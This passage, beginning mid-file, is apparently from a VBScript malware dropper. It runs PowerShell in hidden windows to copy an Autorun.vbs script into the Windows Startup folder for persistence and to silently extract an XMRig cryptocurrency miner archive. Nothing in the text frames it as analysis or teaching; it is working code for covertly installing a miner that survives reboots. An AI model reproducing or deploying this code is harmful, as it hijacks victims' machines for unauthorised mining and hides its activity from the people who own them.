...
objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\Autorun.vbs -Destination $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs -Force", 0, True
objShell.Run "powershell.exe -Command & 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip' 'C:\Users\Public\Downloads\'", 0, True
